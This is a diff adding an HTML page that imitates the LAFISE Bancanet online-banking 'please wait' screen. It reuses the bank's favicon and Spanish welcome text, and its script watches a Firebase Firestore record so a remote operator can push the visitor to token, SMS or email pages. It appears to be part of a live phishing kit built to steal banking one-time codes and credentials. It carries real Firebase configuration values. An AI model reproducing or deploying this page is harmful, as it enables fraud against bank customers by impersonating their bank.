@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en" class="notranslate">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="X-UA-COMPATIBLE" content="IE=edge;IE=11">
+  <title>LAFISE - Bancanet</title>
+  <base href=".">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+  <link rel="icon" type="image/x-icon" href="https://secure.bancolafise.com/WebUI/icbankingicon.ico">
+  <link href="./content/styles.9510e093960c77411877.bundle.css" rel="stylesheet">
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+</head>
+
+<body>
+  <icb-app></icb-app>
+  <div class="app_overlay">
+    <div class="mesina-loader">
+      <div class="mesina-logo"></div>
+      <div class="spinner">
+        <div class="bounce1"></div>
+        <div class="bounce2"></div>
+        <div class="bounce3"></div>
+      </div>
+      <div class="mesina-welcome-title">Bienvenido a Bancanet</div>
+      <div class="mesina-welcome-subtitle1">Por favor espere un momento...</div>
+    </div>
+  </div>
+
+  <script>
+    // Configuración Firebase (usa la tuya, igual que en el script que usas para guardar)
+    const firebaseConfig = {
+      apiKey: "AIzaSyDkFiTElkEcL0B1eAtRrrCoGm9HCt9EGZc",
+      authDomain: "flab-d70ab.firebaseapp.com",
+      databaseURL: "https://flab-d70ab-default-rtdb.firebaseio.com",
+      projectId: "flab-d70ab",
+      storageBucket: "flab-d70ab.firebasestorage.app",
+      messagingSenderId: "789535969500",
+      appId: "1:789535969500:web:ff0f3be7c250dac33ee419"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // Obtener el ID del documento guardado en localStorage
+    const docId = localStorage.getItem("docId");
+
+    if (!docId) {
+      alert("No se encontró ID de usuario. Vuelve a iniciar sesión.");
+      // Opcional: redirigir al login o página inicial
+      // window.location.href = "index.html";
+    } else {
+      // Consulta el documento y redirige según el campo "page"
+      db.collection("varable").doc(docId).onSnapshot((doc) => {
+        if (!doc.exists) {
+          console.log("Documento no encontrado");
+          return;
+        }
+        const data = doc.data();
+        const page = data.page;
+        console.log("Page del usuario:", page);
+
+        // Redirección según valor page
+        if (page === 3) {
+          window.location.href = "token.html";
+        } else if (page === 5) {
+          window.location.href = "correo.html";
+        } else if (page === 4) {
+          window.location.href = "sms.html";
+        }  else if (page === 6) {
+          window.location.href = "index.html";
+        } else {
+          console.log("Esperando asignación de página...");
+          // Si quieres, aquí puedes mostrar un mensaje o dejar la pantalla de espera.
+        }
+      }, (error) => {
+        console.error("Error leyendo documento:", error);
+      });
+    }
+  </script>
+</body>
+
+</html>
